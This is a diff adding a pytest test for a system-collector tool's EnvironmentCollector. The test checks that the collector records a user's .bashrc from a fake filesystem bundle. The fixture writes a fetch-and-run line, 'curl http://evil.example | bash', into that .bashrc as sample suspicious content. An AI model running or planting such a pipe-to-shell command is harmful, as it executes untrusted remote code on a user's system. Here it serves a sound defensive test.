@@ -757,3 +757,28 @@ def test_all_collectors_are_base_collector_subclasses():
     from ubuntils.collectors.base import BaseCollector
     for cls in ALL_COLLECTORS:
         assert issubclass(cls, BaseCollector), f"{cls} is not a BaseCollector subclass"
+
+
+def test_environment_collector_captures_shell_init_files(tmp_path):
+    from ubuntils.collectors.environment import EnvironmentCollector
+    from ubuntils.collectors.source import BundleSource
+
+    files = tmp_path / "files"
+    home = files / "home" / "alice"
+    home.mkdir(parents=True)
+    (files / "etc").mkdir()
+    (files / "etc" / "passwd").write_text(
+        "alice:x:1000:1000::/home/alice:/bin/bash\n"
+    )
+    (home / ".bashrc").write_text("curl http://evil.example | bash\n")
+
+    src = BundleSource(root_dir=str(files), command_index={})
+    result = EnvironmentCollector(source=src).collect()
+
+    shell_files = result["shell_init_files"]
+    assert len(shell_files) == 1
+    entry = shell_files[0]
+    assert entry["owner"] == "alice"
+    assert entry["source"] == "/home/alice/.bashrc"
+    assert "curl http://evil.example | bash" in entry["content"]
+    assert entry["ctime"] > 0
